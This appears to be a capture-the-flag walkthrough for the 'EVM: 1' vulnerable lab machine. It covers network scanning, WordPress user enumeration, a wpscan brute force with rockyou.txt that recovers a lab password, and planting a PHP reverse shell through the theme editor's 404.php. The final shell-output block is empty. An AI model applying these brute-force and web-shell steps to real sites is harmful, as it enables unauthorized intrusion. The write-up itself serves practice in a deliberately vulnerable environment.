# EVM: 1

### 1.Get VM IP

```bash
root@kali: arp-scan -I eth0 -l
Interface: eth0, type: EN10MB, MAC: 08:00:27:b2:e9:3f, IPv4: 192.168.56.102
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1	0a:00:27:00:00:12	(Unknown: locally administered)
192.168.56.100	08:00:27:fe:d5:08	PCS Systemtechnik GmbH
192.168.56.103	08:00:27:26:e3:c3	PCS Systemtechnik GmbH
```

The ip address is `192.168.56.103`, let's enumerate it


### 2.Enumeration

```bash
root@kali: nmap -sT -sV -sC -v -p- -oN nmap.out 192.168.56.103
Nmap scan report for 192.168.56.103
Host is up (0.0020s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:d3:34:13:62:b1:18:a3:dd:db:35:c5:5a:b7:c0:78 (RSA)
|   256 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce (ECDSA)
|_  256 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa (ED25519)
53/tcp  open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: CAPA RESP-CODES UIDL SASL AUTH-RESP-CODE PIPELINING TOP
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: LOGIN-REFERRALS IMAP4rev1 Pre-login LOGINDISABLEDA0001 IDLE SASL-IR listed ENABLE ID OK have more capabilities LITERAL+ post-login
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
MAC Address: 08:00:27:26:E3:C3 (Oracle VirtualBox virtual NIC)
Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m58s, deviation: 2h18m33s, median: -1s
| smb2-time: 
|   date: 2024-04-27T09:57:49
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: ubuntu-extermely-vulnerable-m4ch1ine
|   NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE\x00
|   Domain name: \x00
|   FQDN: ubuntu-extermely-vulnerable-m4ch1ine
|_  System time: 2024-04-27T05:57:49-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   UBUNTU-EXTERMEL<00>  Flags: <unique><active>
|   UBUNTU-EXTERMEL<03>  Flags: <unique><active>
|   UBUNTU-EXTERMEL<20>  Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

Let's check for port 80, which is a default apache page, try to fuzz the website and you find `/wordpress`

try to enumerate the wordpress site :

```bash
root@kali: wpscan --url http://192.168.56.103/wordpress -e u,vp

[i] User(s) Identified:

[+] c0rrupt3d_brain
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.56.103/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

we found a user, `c0rrupt3d_brain`, we can check for brute force attack on this user:

```bash
root@kali: wpscan --url http://192.168.56.103/wordpress -U user.txt -P /usr/share/wordlists/rockyou.txt
```

and yes, it finds password, `24992499`, and we can login to wordpress panel by this user

after logging in try to access `Appearance -> Theme Editor -> 404.php` and upload a php reverse shell

and a netcat listener to get the shell

### 3.Gaining Shell

After uploading the shellm, navigate to `http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/404.php` and you will get the shell :

```bash

```








